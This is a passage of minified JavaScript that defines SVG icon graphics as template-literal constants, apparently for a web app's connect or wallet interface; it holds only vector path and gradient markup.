    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.8437 8.3264C42.4507 7.70891 41.5493 7.70891 41.1564 8.32641L28.978 27.4638C28.5544 28.1295 29.0326 29.0007 29.8217 29.0007H54.1783C54.9674 29.0007 55.4456 28.1295 55.022 27.4638L42.8437 8.3264Z"
      fill="white"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.3348 11.6456C42.659 11.7608 42.9061 12.1492 43.4005 12.926L50.7332 24.4488C51.2952 25.332 51.5763 25.7737 51.5254 26.1382C51.4915 26.3808 51.3698 26.6026 51.1833 26.7614C50.9031 27 50.3796 27 49.3327 27H34.6673C33.6204 27 33.0969 27 32.8167 26.7614C32.6302 26.6026 32.5085 26.3808 32.4746 26.1382C32.4237 25.7737 32.7048 25.332 33.2669 24.4488L40.5995 12.926C41.0939 12.1492 41.341 11.7608 41.6652 11.6456C41.8818 11.5687 42.1182 11.5687 42.3348 11.6456ZM35.0001 26.999C38.8661 26.999 42.0001 23.865 42.0001 19.999C42.0001 23.865 45.1341 26.999 49.0001 26.999H35.0001Z"
      fill="#FF974C"
    />
    <path
      d="M10.1061 9.35712C9.9973 9.67775 9.99867 10.0388 9.99978 10.3323C9.99989 10.3611 10 10.3893 10 10.4167V25.5833C10 25.6107 9.99989 25.6389 9.99978 25.6677C9.99867 25.9612 9.9973 26.3222 10.1061 26.6429C10.306 27.2317 10.7683 27.694 11.3571 27.8939C11.6777 28.0027 12.0388 28.0013 12.3323 28.0002C12.3611 28.0001 12.3893 28 12.4167 28H19C24.5228 28 29 23.5228 29 18C29 12.4772 24.5228 8 19 8H12.4167C12.3893 8 12.3611 7.99989 12.3323 7.99978C12.0388 7.99867 11.6778 7.9973 11.3571 8.10614C10.7683 8.306 10.306 8.76834 10.1061 9.35712Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="19" cy="18" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
    <circle cx="19" cy="42" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="clip0_7734_50402">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,HPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#1DC956"
      d="M0 25.01c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02.11 15.65.11 24.9.11h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.13 60 15.76 60 25v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-3.45 1.97-8.08 1.97-17.33 1.97H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 49.1 0 44.46 0 35.21v-10.2Z"
    />
    <path
      fill="#2BEE6C"
      d="M16.1 60c-3.82-.18-6.4-.64-8.53-1.86a15 15 0 0 1-5.6-5.6C.55 50.06.16 46.97.04 41.98L4.2 40.6a4 4 0 0 0 2.48-2.39l4.65-12.4a2 2 0 0 1 2.5-1.2l2.53.84a2 2 0 0 0 2.43-1l2.96-5.94a2 2 0 0 1 3.7.32l3.78 12.58a2 2 0 0 0 3.03 1.09l3.34-2.23a2 2 0 0 0 .65-.7l5.3-9.72a2 2 0 0 1 1.42-1.01l4.14-.69a2 2 0 0 1 1.6.44l3.9 3.24a2 2 0 0 0 2.7-.12l4.62-4.63c.08 2.2.08 4.8.08 7.93v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-2.13 1.22-4.7 1.68-8.54 1.86H16.11Z"
    />
    <path
      fill="#fff"
      d="m.07 43.03-.05-2.1 3.85-1.28a3 3 0 0 0 1.86-1.79l4.66-12.4a3 3 0 0 1 3.75-1.8l2.53.84a1 1 0 0 0 1.21-.5l2.97-5.94a3 3 0 0 1 5.56.48l3.77 12.58a1 1 0 0 0 1.51.55l3.34-2.23a1 1 0 0 0 .33-.35l5.3-9.71a3 3 0 0 1 2.14-1.53l4.13-.69a3 3 0 0 1 2.41.66l3.9 3.24a1 1 0 0 0 1.34-.06l5.28-5.28c.05.85.08 1.75.1 2.73L56 22.41a3 3 0 0 1-4.04.19l-3.9-3.25a1 1 0 0 0-.8-.21l-4.13.69a1 1 0 0 0-.72.5l-5.3 9.72a3 3 0 0 1-.97 1.05l-3.34 2.23a3 3 0 0 1-4.53-1.63l-3.78-12.58a1 1 0 0 0-1.85-.16l-2.97 5.94a3 3 0 0 1-3.63 1.5l-2.53-.84a1 1 0 0 0-1.25.6l-4.65 12.4a5 5 0 0 1-3.1 3L.07 43.02Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M49.5 19a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M45 .28v59.66l-2 .1V.19c.7.02 1.37.05 2 .1Z" />
    <path fill="#2BEE6C" d="M47.5 19a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
    <path
      stroke="#fff"
      stroke-opacity=".1"
      d="M.5 25.01c0-4.63 0-8.08.24-10.8.25-2.7.73-4.64 1.66-6.28a14.5 14.5 0 0 1 5.42-5.41C9.46 1.58 11.39 1.1 14.1.85A133 133 0 0 1 24.9.61h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.67a14.5 14.5 0 0 1 5.42 5.4c.93 1.65 1.41 3.58 1.66 6.3.24 2.71.24 6.16.24 10.79v10.2c0 4.64 0 8.08-.24 10.8-.25 2.7-.73 4.65-1.66 6.28a14.5 14.5 0 0 1-5.42 5.42c-1.63.93-3.57 1.41-6.28 1.66-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.66a14.5 14.5 0 0 1-5.42-5.42C1.47 50.66 1 48.72.74 46.01A133 133 0 0 1 .5 35.2v-10.2Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg>`,VPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="30" />
    <path
      fill="#E87DE8"
      d="M57.98.01v19.5a4.09 4.09 0 0 0-2.63 2.29L50.7 34.2a2 2 0 0 1-2.5 1.2l-2.53-.84a2 2 0 0 0-2.42 1l-2.97 5.94a2 2 0 0 1-3.7-.32L32.8 28.6a2 2 0 0 0-3.02-1.09l-3.35 2.23a2 2 0 0 0-.64.7l-5.3 9.72a2 2 0 0 1-1.43 1.01l-4.13.69a2 2 0 0 1-1.61-.44l-3.9-3.24a2 2 0 0 0-2.69.12L2.1 42.93.02 43V.01h57.96Z"
    />
    <path
      fill="#fff"
      d="m61.95 16.94.05 2.1-3.85 1.28a3 3 0 0 0-1.86 1.79l-4.65 12.4a3 3 0 0 1-3.76 1.8l-2.53-.84a1 1 0 0 0-1.2.5l-2.98 5.94a3 3 0 0 1-5.55-.48l-3.78-12.58a1 1 0 0 0-1.5-.55l-3.35 2.23a1 1 0 0 0-.32.35l-5.3 9.72a3 3 0 0 1-2.14 1.52l-4.14.69a3 3 0 0 1-2.41-.66l-3.9-3.24a1 1 0 0 0-1.34.06l-5.28 5.28c-.05-.84-.08-1.75-.1-2.73l3.97-3.96a3 3 0 0 1 4.04-.19l3.89 3.25a1 1 0 0 0 .8.21l4.14-.68a1 1 0 0 0 .71-.51l5.3-9.71a3 3 0 0 1 .97-1.06l3.34-2.23a3 3 0 0 1 4.54 1.63l3.77 12.58a1 1 0 0 0 1.86.16l2.96-5.93a3 3 0 0 1 3.64-1.5l2.52.83a1 1 0 0 0 1.25-.6l4.66-12.4a5 5 0 0 1 3.1-2.99l4.43-1.48Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M35.5 27a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M31 0v60h-2V0h2Z" />
    <path fill="#E87DE8" d="M33.5 27a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,KPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#987DE8" rx="30" />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="m15.48 28.37 11.97-19.3a3 3 0 0 1 5.1 0l11.97 19.3a6 6 0 0 1 .9 3.14v.03a6 6 0 0 1-1.16 3.56L33.23 50.2a4 4 0 0 1-6.46 0L15.73 35.1a6 6 0 0 1-1.15-3.54v-.03a6 6 0 0 1 .9-3.16Z"
      clip-rule="evenodd"
    />
    <path
      fill="#643CDD"
      d="M30.84 10.11a1 1 0 0 0-.84-.46V24.5l12.6 5.53a2 2 0 0 0-.28-1.4L30.84 10.11Z"
    />
    <path
      fill="#BDADEB"
      d="M30 9.65a1 1 0 0 0-.85.46L17.66 28.64a2 2 0 0 0-.26 1.39L30 24.5V9.65Z"
    />
    <path
      fill="#643CDD"
      d="M30 50.54a1 1 0 0 0 .8-.4l11.24-15.38c.3-.44-.2-1-.66-.73l-9.89 5.68a3 3 0 0 1-1.5.4v10.43Z"
    />
    <path
      fill="#BDADEB"
      d="m17.97 34.76 11.22 15.37c.2.28.5.41.8.41V40.11a3 3 0 0 1-1.49-.4l-9.88-5.68c-.47-.27-.97.3-.65.73Z"
    />
    <path
      fill="#401AB3"
      d="M42.6 30.03 30 24.5v13.14a3 3 0 0 0 1.5-.4l10.14-5.83a2 2 0 0 0 .95-1.38Z"
    />
    <path
      fill="#7C5AE2"
      d="M30 37.64V24.46l-12.6 5.57a2 2 0 0 0 .97 1.39l10.13 5.82a3 3 0 0 0 1.5.4Z"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,GPe=xe`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <rect width="64" height="64" rx="30" fill="#1DC956"/>
  <rect x="0.5" y="0.5" width="63" height="63" rx="29.5" stroke="#141414" stroke-opacity="0.1"/>
  <path d="M32.4053 19.8031C35.3901 19.8031 38.0431 20.8349 40.1619 22.8247L45.9656 17.0211C42.4465 13.7416 37.8773 11.7333 32.4053 11.7333C24.4829 11.7333 17.6475 16.2841 14.3127 22.9168L21.056 28.1493C22.6589 23.359 27.136 19.8031 32.4053 19.8031Z" fill="#1DC956" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  <path d="M32.4053 52.2667C37.8773 52.2667 42.465 50.4611 45.8182 47.3658L39.2407 42.2623C37.4351 43.4783 35.1321 44.2153 32.4053 44.2153C27.136 44.2153 22.6589 40.6594 21.056 35.8691L14.3127 41.1016C17.6475 47.7159 24.4829 52.2667 32.4053 52.2667Z" fill="#2BEE6C"/>
  <path d="M21.056 35.8507L19.5636 36.993L14.3127 41.0832M39.2407 42.2623L45.8182 47.3658C42.465 50.4611 37.8773 52.2667 32.4053 52.2667C24.4829 52.2667 17.6475 47.7159 14.3127 41.1016L21.056 35.8691C22.6589 40.6594 27.136 44.2153 32.4053 44.2153C35.1321 44.2153 37.4351 43.4783 39.2407 42.2623Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  <path d="M51.8613 32.4606C51.8613 31.0235 51.7323 29.6417 51.4928 28.3151H32.4053V36.1638H43.3124C42.8334 38.688 41.3963 40.8252 39.2407 42.2623L45.8181 47.3658C49.6503 43.8283 51.8613 38.6327 51.8613 32.4606Z" fill="#1FAD7E" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  <path d="M21.056 35.8507C20.6507 34.6347 20.4111 33.345 20.4111 32C20.4111 30.655 20.6507 29.3653 21.056 28.1493L14.3127 22.9169C12.9309 25.6437 12.1387 28.7205 12.1387 32C12.1387 35.2795 12.9309 38.3564 14.3127 41.0831L19.5636 36.993L21.056 35.8507Z" fill="#86F999"/>
  <path d="M21.056 35.8691L14.3127 41.1016M21.056 35.8507C20.6507 34.6347 20.4111 33.345 20.4111 32C20.4111 30.655 20.6507 29.3653 21.056 28.1493L14.3127 22.9169C12.9309 25.6437 12.1387 28.7205 12.1387 32C12.1387 35.2795 12.9309 38.3564 14.3127 41.0831L19.5636 36.993L21.056 35.8507Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
</svg>
`,ZPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="3" />
  <path
    fill="#1FAD7E"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 29.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 19.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#86F999"
    stroke="#fff"
    stroke-width="2"
    d="m46.69 21.06-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-6.32-3.51-.18-.1c-2.33-1.3-3.72-2.06-5.22-2.33a9 9 0 0 0-3.08 0c-1.5.27-2.9 1.04-5.22 2.33l-.17.1-6.33 3.51-.05.03c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45Z"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,YPe=xe`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <g clip-path="url(#clip0_241_31636)">
    <path d="M0 26.5595C0 16.6913 0 11.7572 2.1019 8.07217C3.5216 5.58318 5.58366 3.52111 8.07266 2.10141C11.7577 -0.000488281 16.6918 -0.000488281 26.56 -0.000488281H37.44C47.3082 -0.000488281 52.2423 -0.000488281 55.9273 2.10141C58.4163 3.52111 60.4784 5.58318 61.8981 8.07217C64 11.7572 64 16.6913 64 26.5595V37.4395C64 47.3077 64 52.2418 61.8981 55.9269C60.4784 58.4159 58.4163 60.4779 55.9273 61.8976C52.2423 63.9995 47.3082 63.9995 37.44 63.9995H26.56C16.6918 63.9995 11.7577 63.9995 8.07266 61.8976C5.58366 60.4779 3.5216 58.4159 2.1019 55.9269C0 52.2418 0 47.3077 0 37.4395V26.5595Z" fill="#794CFF"/>
    <path d="M0.5 26.5595C0.5 21.6163 0.50047 17.942 0.760736 15.0418C1.02039 12.1485 1.53555 10.0742 2.53621 8.3199C3.91155 5.90869 5.90917 3.91106 8.32039 2.53572C10.0747 1.53506 12.1489 1.01991 15.0423 0.760247C17.9425 0.499981 21.6168 0.499512 26.56 0.499512H37.44C42.3832 0.499512 46.0575 0.499981 48.9577 0.760247C51.8511 1.01991 53.9253 1.53506 55.6796 2.53572C58.0908 3.91106 60.0885 5.90869 61.4638 8.3199C62.4645 10.0742 62.9796 12.1485 63.2393 15.0418C63.4995 17.942 63.5 21.6163 63.5 26.5595V37.4395C63.5 42.3827 63.4995 46.057 63.2393 48.9572C62.9796 51.8506 62.4645 53.9248 61.4638 55.6791C60.0885 58.0903 58.0908 60.088 55.6796 61.4633C53.9253 62.464 51.8511 62.9791 48.9577 63.2388C46.0575 63.499 42.3832 63.4995 37.44 63.4995H26.56C21.6168 63.4995 17.9425 63.499 15.0423 63.2388C12.1489 62.9791 10.0747 62.464 8.32039 61.4633C5.90917 60.088 3.91155 58.0903 2.53621 55.6791C1.53555 53.9248 1.02039 51.8506 0.760736 48.9572C0.50047 46.057 0.5 42.3827 0.5 37.4395V26.5595Z" stroke="#141414" stroke-opacity="0.1"/>
    <path d="M40 39.4595C44.7824 36.693 48 31.5222 48 25.6C48 16.7634 40.8366 9.59998 32 9.59998C23.1634 9.59998 16 16.7634 16 25.6C16 31.5222 19.2176 36.693 24 39.4595V45.8144H40V39.4595Z" fill="#906EF7"/>
    <path d="M24 49.9689C24 51.8192 24 52.7444 24.3941 53.4353C24.6603 53.902 25.0469 54.2886 25.5136 54.5548C26.2046 54.9489 27.1297 54.9489 28.98 54.9489H35.02C36.8703 54.9489 37.7954 54.9489 38.4864 54.5548C38.9531 54.2886 39.3397 53.902 39.6059 53.4353C40 52.7444 40 51.8192 40 49.9689V45.8144H24V49.9689Z" fill="#906EF7"/>
    <path d="M24 45.8144V39.4595C19.2176 36.693 16 31.5222 16 25.6C16 16.7634 23.1634 9.59998 32 9.59998C40.8366 9.59998 48 16.7634 48 25.6C48 31.5222 44.7824 36.693 40 39.4595V45.8144M24 45.8144H40M24 45.8144V49.9689C24 51.8192 24 52.7444 24.3941 53.4353C24.6603 53.902 25.0469 54.2886 25.5136 54.5548C26.2046 54.9489 27.1297 54.9489 28.98 54.9489H35.02C36.8703 54.9489 37.7954 54.9489 38.4864 54.5548C38.9531 54.2886 39.3397 53.902 39.6059 53.4353C40 52.7444 40 51.8192 40 49.9689V45.8144" stroke="white" stroke-width="2" stroke-linejoin="round"/>
    <path d="M24 49.9689C24 51.8192 24 52.7444 24.3941 53.4353C24.6603 53.902 25.0469 54.2886 25.5136 54.5548C26.2046 54.9489 27.1297 54.9489 28.98 54.9489H35.02C36.8703 54.9489 37.7954 54.9489 38.4864 54.5548C38.9531 54.2886 39.3397 53.902 39.6059 53.4353C40 52.7444 40 51.8192 40 49.9689V45.8144H24V49.9689Z" fill="#643CDD" stroke="white" stroke-width="2" stroke-linejoin="round"/>
    <path d="M29.6735 26.9101V29.1109H34.0753V26.9101C34.0753 25.6945 35.0607 24.7092 36.2762 24.7092C37.4917 24.7092 38.4771 25.6945 38.4771 26.9101C38.4771 28.1256 37.4917 29.1109 36.2762 29.1109H34.0753H29.6735H27.4726C26.2571 29.1109 25.2717 28.1256 25.2717 26.9101C25.2717 25.6945 26.2571 24.7092 27.4726 24.7092C28.6881 24.7092 29.6735 25.6945 29.6735 26.9101Z" fill="#906EF7"/>
    <path d="M29.6735 45.3183V26.9101C29.6735 25.6945 28.6881 24.7092 27.4726 24.7092V24.7092C26.2571 24.7092 25.2717 25.6945 25.2717 26.9101V26.9101C25.2717 28.1256 26.2571 29.1109 27.4726 29.1109H36.2762C37.4917 29.1109 38.4771 28.1256 38.4771 26.9101V26.9101C38.4771 25.6945 37.4917 24.7092 36.2762 24.7092V24.7092C35.0607 24.7092 34.0753 25.6945 34.0753 26.9101V45.3183" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  </g>
  <defs>
    <clipPath id="clip0_241_31636">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
`,JPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#C653C6" rx="3" />
  <path
    fill="#fff"
    d="M20.03 15.22C20 15.6 20 16.07 20 17v2.8c0 1.14 0 1.7-.2 2.12-.15.31-.3.5-.58.71-.37.28-1.06.42-2.43.7-.59.12-1.11.29-1.6.51a9 9 0 0 0-4.35 4.36C10 30 10 32.34 10 37c0 4.66 0 7 .84 8.8a9 9 0 0 0 4.36 4.36C17 51 19.34 51 24 51h12c4.66 0 7 0 8.8-.84a9 9 0 0 0 4.36-4.36C50 44 50 41.66 50 37c0-4.66 0-7-.84-8.8a9 9 0 0 0-4.36-4.36c-.48-.22-1-.39-1.6-.5-1.36-.29-2.05-.43-2.42-.7-.27-.22-.43-.4-.58-.72-.2-.42-.2-.98-.2-2.11V17c0-.93 0-1.4-.03-1.78a9 9 0 0 0-8.19-8.19C31.4 7 30.93 7 30 7s-1.4 0-1.78.03a9 9 0 0 0-8.19 8.19Z"
  />
  <path
    fill="#E87DE8"
    d="M22 17c0-.93 0-1.4.04-1.78a7 7 0 0 1 6.18-6.18C28.6 9 29.07 9 30 9s1.4 0 1.78.04a7 7 0 0 1 6.18 6.18c.04.39.04.85.04 1.78v4.5a1.5 1.5 0 0 1-3 0V17c0-.93 0-1.4-.08-1.78a4 4 0 0 0-3.14-3.14C31.39 12 30.93 12 30 12s-1.4 0-1.78.08a4 4 0 0 0-3.14 3.14c-.08.39-.08.85-.08 1.78v4.5a1.5 1.5 0 0 1-3 0V17Z"
  />
  <path
    fill="#E87DE8"
    fill-rule="evenodd"
    d="M12 36.62c0-4.32 0-6.48.92-8.09a7 7 0 0 1 2.61-2.61C17.14 25 19.3 25 23.62 25h6.86c.46 0 .7 0 .9.02 2.73.22 4.37 2.43 4.62 4.98.27-2.7 2.11-5 5.02-5A6.98 6.98 0 0 1 48 31.98v5.4c0 4.32 0 6.48-.92 8.09a7 7 0 0 1-2.61 2.61c-1.61.92-3.77.92-8.09.92h-5.86c-.46 0-.7 0-.9-.02-2.73-.22-4.37-2.43-4.62-4.98-.26 2.58-1.94 4.82-4.71 4.99l-.7.01c-.55 0-.82 0-1.05-.02a7 7 0 0 1-6.52-6.52c-.02-.23-.02-.5-.02-1.05v-4.79Zm21.24-.27a4 4 0 1 0-6.48 0 31.28 31.28 0 0 1 1.57 2.23c.17.4.17.81.17 1.24V42.5a1.5 1.5 0 0 0 3 0V39.82c0-.43 0-.85.17-1.24.09-.2.58-.87 1.57-2.23Z"
    clip-rule="evenodd"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,QPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#EB8B47"
      d="M0 24.9c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02 0 15.65 0 24.9 0h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.02 60 15.65 60 24.9v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6C48.98 60 44.35 60 35.1 60H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 48.98 0 44.35 0 35.1V24.9Z"
    />
    <path
      stroke="#062B2B"
      stroke-opacity=".1"
      d="M.5 24.9c0-4.64 0-8.08.24-10.8.25-2.7.73-4.65 1.66-6.28A14.5 14.5 0 0 1 7.82 2.4C9.46 1.47 11.39 1 14.1.74A133 133 0 0 1 24.9.5h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.66a14.5 14.5 0 0 1 5.42 5.42c.93 1.63 1.41 3.57 1.66 6.28.24 2.72.24 6.16.24 10.8v10.2c0 4.63 0 8.08-.24 10.8-.25 2.7-.73 4.64-1.66 6.28a14.5 14.5 0 0 1-5.42 5.41c-1.63.94-3.57 1.42-6.28 1.67-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.67a14.5 14.5 0 0 1-5.42-5.4C1.47 50.53 1 48.6.74 45.88A133 133 0 0 1 .5 35.1V24.9Z"
    />
    <path
      fill="#FF974C"
      stroke="#fff"
      stroke-width="2"
      d="M39.2 29.2a13 13 0 1 0-18.4 0l1.3 1.28a12.82 12.82 0 0 1 2.1 2.39 6 6 0 0 1 .6 1.47c.2.76.2 1.56.2 3.17v11.24c0 1.08 0 1.61.13 2.12a4 4 0 0 0 .41.98c.26.45.64.83 1.4 1.6l.3.29c.65.65.98.98 1.36 1.09.26.07.54.07.8 0 .38-.11.7-.44 1.36-1.1l3.48-3.47c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.47-.48c-.65-.65-.98-.98-1.09-1.36a1.5 1.5 0 0 1 0-.8c.1-.38.44-.7 1.1-1.36l.47-.48c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.48-.5c-.65-.64-.98-.97-1.08-1.35a1.5 1.5 0 0 1 0-.79c.1-.38.42-.7 1.06-1.36l5.46-5.55Z"
    />
    <circle cx="30" cy="17" r="4" fill="#EB8B47" stroke="#fff" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg> `,XPe=xe`<svg width="40" height="42" viewBox="0 0 40 42" fill="none">
<path opacity="0.7" d="M19.9526 41.9076L7.3877 34.655V26.1226L19.9526 33.3751V41.9076Z" fill="url(#paint0_linear_2113_32117)"/>
<path opacity="0.7" d="M19.9521 41.9076L32.5171 34.655V26.1226L19.9521 33.3751V41.9076Z" fill="url(#paint1_linear_2113_32117)"/>
<path opacity="0.7" d="M39.9095 7.34521V21.8562L32.5166 26.1225V11.6114L39.9095 7.34521Z" fill="url(#paint2_linear_2113_32117)"/>
<path d="M39.9099 7.34536L27.345 0.0927734L19.9521 4.359L32.5171 11.6116L39.9099 7.34536Z" fill="url(#paint3_linear_2113_32117)"/>
<path d="M0 7.34536L12.5649 0.0927734L19.9519 4.359L7.387 11.6116L0 7.34536Z" fill="#F969D3"/>
<path opacity="0.7" d="M0 7.34521V21.8562L7.387 26.1225V11.6114L0 7.34521Z" fill="url(#paint4_linear_2113_32117)"/>
<defs>
<linearGradient id="paint0_linear_2113_32117" x1="18.6099" y1="41.8335" x2="7.73529" y2="8.31842" gradientUnits="userSpaceOnUse">
<stop stop-color="#E98ADA"/>
<stop offset="1" stop-color="#7E4DBD"/>
</linearGradient>
<linearGradient id="paint1_linear_2113_32117" x1="26.2346" y1="26.1226" x2="26.2346" y2="41.9076" gradientUnits="userSpaceOnUse">
<stop stop-color="#719DED"/>
<stop offset="1" stop-color="#2545BE"/>
</linearGradient>
<linearGradient id="paint2_linear_2113_32117" x1="36.213" y1="7.34521" x2="36.213" y2="26.1225" gradientUnits="userSpaceOnUse">
<stop stop-color="#93EBFF"/>
<stop offset="1" stop-color="#197DDB"/>
</linearGradient>
<linearGradient id="paint3_linear_2113_32117" x1="29.931" y1="0.0927734" x2="38.2156" y2="14.8448" gradientUnits="userSpaceOnUse">
<stop stop-color="#F969D3"/>
<stop offset="1" stop-color="#4F51C0"/>
</linearGradient>
<linearGradient id="paint4_linear_2113_32117" x1="18.1251" y1="44.2539" x2="-7.06792" y2="15.2763" gradientUnits="userSpaceOnUse">
<stop stop-color="#E98ADA"/>
<stop offset="1" stop-color="#7E4DBD"/>
</linearGradient>
</defs>
</svg>`,e$e=xe`
  <svg width="40" height="40" fill="none" xmlns="http://www.w3.org/2000/svg">
    <g clip-path="url(#a)">
      <path
        d="M0 16.6c0-6.168 0-9.251 1.314-11.555a10 10 0 0 1 3.731-3.731C7.35 0 10.432 0 16.6 0h6.8c6.168 0 9.252 0 11.555 1.314a10 10 0 0 1 3.731 3.731C40 7.35 40 10.432 40 16.6v6.8c0 6.168 0 9.252-1.314 11.555a10 10 0 0 1-3.731 3.731C32.652 40 29.568 40 23.4 40h-6.8c-6.168 0-9.251 0-11.555-1.314a10 10 0 0 1-3.731-3.731C0 32.652 0 29.568 0 23.4v-6.8Z"
        fill="#7D00FF"
      />
      <path
